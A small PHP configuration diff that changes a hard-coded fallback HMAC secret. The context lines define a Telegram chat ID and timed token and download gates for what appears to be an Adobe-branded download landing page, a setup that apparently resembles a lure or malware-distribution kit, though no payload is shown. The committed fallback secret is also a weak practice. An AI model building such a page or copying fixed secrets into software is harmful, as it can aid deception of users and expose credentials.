@@ -26,7 +26,7 @@ define('TG_CHAT',  '6221767926');
 // Stable HMAC secret so a token issued by index.php validates in later
 // requests (each web request is a separate process). Env-overridable; the
 // fallback is fixed so the app works with zero config.
-define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-landing-9f2e1c7a4b83-0a6d5512'));
+define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-kidco-v2-k3f9a1c7-4e2b88d0'));
 
 define('TTL', 900);            // token lifetime (15 min)
 define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
